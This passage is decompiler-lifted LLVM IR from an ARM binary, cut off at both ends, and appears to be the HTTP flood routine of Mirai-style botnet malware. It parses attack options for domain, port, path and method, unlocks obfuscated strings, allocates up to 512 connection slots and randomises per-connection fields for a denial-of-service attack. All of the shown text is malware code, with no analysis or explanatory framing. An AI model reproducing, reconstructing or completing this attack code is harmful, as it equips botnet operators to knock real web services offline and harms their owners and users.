  %v0_823c = load i32, i32* @r4, align 4
  store i32 %v0_823c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b36c.32 to i32), i32* %r3.global-to-local, align 4
  %v5_8244 = inttoptr i32 %v0_8230 to i32*
  %v6_8244 = call i32 @attack_get_opt_str(i32 %v0_823c, i32* %v5_8244, i32 21, i32 ptrtoint (i32* @global_var_1b36c.32 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8248 = load i32, i32* @r5, align 4
  store i32 %v0_8248, i32* %r1.global-to-local, align 4
  store i32 %v6_8244, i32* @r8, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v0_8254 = load i32, i32* @r4, align 4
  store i32 %v0_8254, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_825c = inttoptr i32 %v0_8248 to i32*
  %v5_825c = call i32 @attack_get_opt_int(i32 %v0_8254, i32* %v4_825c, i32 23, i32 1)
  %v0_8260 = load i32, i32* @r5, align 4
  store i32 %v0_8260, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_825c, i32* @r6, align 4
  %v0_8270 = load i32, i32* @r4, align 4
  store i32 %v0_8270, i32* %r0.global-to-local, align 4
  %v4_8274 = inttoptr i32 %v0_8260 to i32*
  %v5_8274 = call i32 @attack_get_opt_int(i32 %v0_8270, i32* %v4_8274, i32 7, i32 80)
  %v2_827c = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8284 = mul i32 %v5_8274, 65536
  store i32 %v3_8284, i32* %r3.global-to-local, align 4
  %tmp168 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8298 = urem i32 %v5_8274, 65536
  store i32 %v3_8298, i32* @r7, align 4
  %v4_829c = call i32 @__GI_memset(i8* %tmp168, i32 0, i32 10241)
  store i32 %v4_829c, i32* %r0.global-to-local, align 4
  %v0_82a0 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_82a0 = icmp eq i32 %v0_82a0, 0
  store i1 %v2_82a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a0, label %.thread14, label %bb

bb:                                               ; preds = %entry
  %v1_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_82a4 = icmp eq i32 %v1_82a4, 0
  store i1 %v3_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a4, label %bb169, label %dec_label_pc_82c4

.thread14:                                        ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

bb169:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %bb169, %dec_label_pc_82e4, %.thread14, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v1_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v4_829c, %.thread14 ], [ %v4_829c, %bb169 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  store i32 %v3_81d0, i32* %r4.global-to-local, align 4
  store i32 %v18_81d0, i32* %sb.global-to-local, align 4
  ret i32 %v1_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a0, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a0 to i8*
  %v2_82c8 = call i32 @util_strlen(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b4, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* @sl, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @util_strlen(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b4, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* @sb, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @util_strlen(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b4, label %bb170

bb170:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb170, %bb174
  %v0_82fc = load i32, i32* @sb, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @util_strlen(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* @sb, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_8314, %bb171
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb171 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb171 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb173, label %._crit_edge

._crit_edge:                                      ; preds = %bb172
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb174

bb173:                                            ; preds = %bb172
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb174

bb174:                                            ; preds = %._crit_edge, %bb173
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb173 ]
  store i32 %v10_82f0, i32* @lr, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @table_unlock_val(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @table_unlock_val(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @table_unlock_val(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @table_unlock_val(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @table_unlock_val(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @table_unlock_val(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @table_unlock_val(i32 45)
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @table_unlock_val(i32 46)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @table_unlock_val(i32 47)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @table_unlock_val(i32 48)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v3_8390 = icmp ugt i32 %v0_8390, 511
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 512
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 512
  br i1 %v5_8394, label %thread-pre-split, label %bb175

bb175:                                            ; preds = %dec_label_pc_8340
  store i32 512, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb175
  %v0_839c = phi i32 [ 512, %bb175 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @table_unlock_val(i32 49)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @calloc(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  %tmp176 = icmp slt i32 %v0_839c, 1
  br i1 %tmp176, label %dec_label_pc_84fc, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %thread-pre-split
  store i32 %v2_83b0, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e44, %dec_label_pc_83c4
  %v1_83d8 = phi i32 [ %v1_9e60, %dec_label_pc_9e44 ], [ %v2_83b0, %dec_label_pc_83c4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* %fp.global-to-local, align 4
  %v1_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_83e4 = udiv i32 %v0_83e0, %v1_83e4
  %v3_83e4 = urem i32 %v0_83e0, %v1_83e4
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %v3_83e4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v3_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v3_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @util_strcpy(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @util_strlen(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @memmove(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* @sb, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @util_strcpy(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* @sb, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @util_strcpy(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* @sl, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @util_strcpy(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c0, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @rand_next()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8484 = and i32 %v0_8484, 16711680
  store i32 %v1_8484, i32* %r1.global-to-local, align 4
  %v3_8488 = udiv i32 %v0_8484, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_848c = udiv i32 %v1_8484, 256
  %v5_848c = or i32 %v4_848c, %v3_8488
  store i32 %v5_848c, i32* %r2.global-to-local, align 4
  %v1_8490 = and i32 %v0_8484, 65280
  store i32 %v1_8490, i32* %r3.global-to-local, align 4
  %v0_8494 = load i32, i32* @r6, align 4
  %v1_8494 = add i32 %v0_8494, 20
  %v2_8494 = inttoptr i32 %v1_8494 to i8*
  %v3_8494 = load i8, i8* %v2_8494, align 1
  %v4_8494 = zext i8 %v3_8494 to i32
  %v5_849c = call i32 @llvm.bswap.i32(i32 %v0_8484)
  %v7_84a0 = lshr i32 %v0_8480, %v4_8494
  %v8_84a0 = add i32 %v7_84a0, %v5_849c
  store i32 %v8_84a0, i32* %r2.global-to-local, align 4
  %v1_84a4 = and i32 %v8_84a0, 16711680
  store i32 %v1_84a4, i32* %r0.global-to-local, align 4
  %v1_84b0 = and i32 %v8_84a0, 65280
  store i32 %v1_84b0, i32* %r1.global-to-local, align 4
  %v2_84b8 = and i32 %v8_84a0, 256
  %v3_84b8 = icmp ne i32 %v2_84b8, 0
  store i1 %v3_84b8, i1* %cpsr_c.global-to-local, align 1
  %v5_84b8 = call i32 @llvm.bswap.i32(i32 %v8_84a0)
  store i32 %v5_84b8, i32* %r3.global-to-local, align 4
  %v1_84bc = load i32, i32* @r5, align 4
  %v2_84bc = add i32 %v1_84bc, 16
  %v3_84bc = inttoptr i32 %v2_84bc to i32*
  store i32 %v5_84b8, i32* %v3_84bc, align 4
  br label %dec_label_pc_84c0

dec_label_pc_84c0:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c0 = call i32 @rand_next()
  %v3_84cc = udiv i32 %v0_84c0, 5
  store i32 %v3_84cc, i32* %r2.global-to-local, align 4
  store i32 %v3_84cc, i32* %r3.global-to-local, align 4
  %v2_84d8 = sub i32 %v0_84c0, %v3_84cc
  store i32 %v2_84d8, i32* %r0.global-to-local, align 4
  %v7_84dc = icmp eq i32 %v2_84d8, 4
  store i1 %v7_84dc, i1* %cpsr_z.global-to-local, align 1
  %v5_84e0 = and i32 %v2_84d8, 1073741824
  %v6_84e0 = icmp ne i32 %v5_84e0, 0
  store i1 %v6_84e0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d8, label %dec_label_pc_9e44 [
    i32 0, label %dec_label_pc_9f08
    i32 1, label %dec_label_pc_9edc
    i32 2, label %dec_label_pc_9f34
    i32 3, label %dec_label_pc_9e1c
    i32 4, label %dec_label_pc_9e9c
  ]

dec_label_pc_84fc:                                ; preds = %thread-pre-split
  %v0_850c = load i32, i32* @r7, align 4
  %v1_850c = and i32 %v0_850c, 128
  %v2_850c = icmp ne i32 %v1_850c, 0
  store i1 %v2_850c, i1* %cpsr_c.global-to-local, align 1
  %v3_850c = udiv i32 %v0_850c, 256
  store i32 %v3_850c, i32* %r3.global-to-local, align 4
  %v1_8510 = add i32 %v2_83b0, 1452
  store i32 %v1_8510, i32* %r1.global-to-local, align 4
  %v2_8514 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_8514, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_852c.preheader:                      ; preds = %dec_label_pc_84fc, %dec_label_pc_9e68
  %v0_9e78.sink = phi i32 [ %v0_9e78, %dec_label_pc_9e68 ], [ %v0_850c, %dec_label_pc_84fc ]
  %stack_var_-20864.0.ph = phi i32 [ %v3_9e78, %dec_label_pc_9e68 ], [ %v3_850c, %dec_label_pc_84fc ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e80, %dec_label_pc_9e68 ], [ %v2_8514, %dec_label_pc_84fc ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9e7c, %dec_label_pc_9e68 ], [ %v1_8510, %dec_label_pc_84fc ]
  %v1_9e84 = urem i32 %v0_9e78.sink, 256
  store i32 %v1_9e84, i32* @r7, align 4
  %v2_8694 = ptrtoint i32* %stack_var_-152 to i32
  %v2_86ac = ptrtoint i32* %stack_var_-44 to i32
  %v2_86f4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8710 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88f0 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c4c = icmp eq i32 %v6_81fc, 0
  %v1_8b48 = inttoptr i32 %v6_81fc to i8*
  %v2_8778 = ptrtoint i32* %stack_var_-60 to i32
  %v2_877c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8780 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8860 = ptrtoint i32* %stack_var_-48 to i32
  %v2_886c = ptrtoint i32* %stack_var_-52 to i32
  %v4_86cc = mul nuw nsw i32 %v1_9e84, 256
  %v5_86cc = or i32 %v4_86cc, %stack_var_-20864.0.ph
  br label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %dec_label_pc_8758, %dec_label_pc_858c, %dec_label_pc_8750, %dec_label_pc_87ec, %dec_label_pc_852c.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8530 = call i32 @__GI_time(i32* null)
  store i32 %v2_8530, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_855c225 = load i32, i32* @sp, align 4
  %v3_855c226 = add i32 %v2_855c225, 20688
  %v4_855c227 = inttoptr i32 %v3_855c226 to i32*
  store i32 0, i32* %v4_855c227, align 4
  br label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8548.dec_label_pc_8548_crit_edge:    ; preds = %dec_label_pc_852c, %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  %v0_8548.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_854c = add i32 %v0_8548.pre, 4
  store i32 %v1_854c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8554 = add i32 %v0_8548.pre, 20684
  store i32 %v1_8554, i32* @lr, align 4
  %v7_8558 = icmp eq i32 %v1_854c, 128
  %v2_855c = load i32, i32* @sp, align 4
  %v3_855c = add i32 %v2_855c, %v1_8554
  %v4_855c = inttoptr i32 %v3_855c to i32*
  store i32 0, i32* %v4_855c, align 4
  br i1 %v7_8558, label %dec_label_pc_8564, label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8564:                                ; preds = %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* @r1, align 4
  %v0_8568 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8568, i32* %stack_var_-332, align 4
  %v0_856c = load i32, i32* %r3.global-to-local, align 4
  %v1_8574228 = add i32 %v0_856c, -120
  store i32 %v1_8574228, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c229 = add i32 %v0_856c, 20432
  store i32 %v1_857c229, i32* %r2.global-to-local, align 4
  %v7_8580230 = icmp eq i32 %v1_8574228, 128
  %v2_8584231 = load i32, i32* @sp, align 4
  %v3_8584232 = add i32 %v2_8584231, %v1_857c229
  %v4_8584233 = inttoptr i32 %v3_8584232 to i32*
  store i32 0, i32* %v4_8584233, align 4
  br i1 %v7_8580230, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_8570.dec_label_pc_8570_crit_edge:    ; preds = %dec_label_pc_8564, %dec_label_pc_8570.dec_label_pc_8570_crit_edge
  %v0_8570.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8574 = add i32 %v0_8570.pre, 4
  store i32 %v1_8574, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c = add i32 %v0_8570.pre, 20556
  store i32 %v1_857c, i32* %r2.global-to-local, align 4
  %v7_8580 = icmp eq i32 %v1_8574, 128
  %v2_8584 = load i32, i32* @sp, align 4
  %v3_8584 = add i32 %v2_8584, %v1_857c
  %v4_8584 = inttoptr i32 %v3_8584 to i32*
  store i32 0, i32* %v4_8584, align 4
  br i1 %v7_8580, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_858c:                                ; preds = %dec_label_pc_8570.dec_label_pc_8570_crit_edge, %dec_label_pc_8564
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8590 = load i32, i32* %r0.global-to-local, align 4
  %v3_8590 = icmp uge i32 %v0_839c, %v1_8590
  store i1 %v3_8590, i1* %cpsr_c.global-to-local, align 1
  %v9_8590 = icmp eq i32 %v0_839c, %v1_8590
  store i1 %v9_8590, i1* %cpsr_z.global-to-local, align 1
  %v7_8594 = icmp sgt i32 %v0_839c, %v1_8590
  br i1 %v7_8594, label %dec_label_pc_8598, label %dec_label_pc_852c

dec_label_pc_8598:                                ; preds = %dec_label_pc_858c
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8590, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8590, i32* @r7, align 4
  br label %dec_label_pc_860c

dec_label_pc_85ac:                                ; preds = %dec_label_pc_8620
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_85ac = icmp eq i8 %v3_860c, 2
  store i1 %v7_85ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85ac, label %dec_label_pc_8cec, label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_85ac
  %v2_85b4 = icmp ugt i8 %v3_860c, 3
  store i1 %v2_85b4, i1* %cpsr_c.global-to-local, align 1
  %v7_85b4 = icmp eq i8 %v3_860c, 4
  store i1 %v7_85b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b4, label %dec_label_pc_88bc, label %dec_label_pc_85bc

dec_label_pc_85bc:                                ; preds = %dec_label_pc_85b4
  %v1_85bc = add nsw i32 %v4_860c, -6
  %v2_85bc = icmp ugt i8 %v3_860c, 5
  store i1 %v2_85bc, i1* %cpsr_c.global-to-local, align 1
  %v7_85bc = icmp eq i8 %v3_860c, 6
  store i1 %v7_85bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85bc, label %dec_label_pc_8d1c, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85bc
  %v2_85c4 = icmp ugt i8 %v3_860c, 6
  store i1 %v2_85c4, i1* %cpsr_c.global-to-local, align 1
  %v7_85c4 = icmp eq i8 %v3_860c, 7
  store i1 %v7_85c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c4, label %dec_label_pc_8f58, label %dec_label_pc_85cc

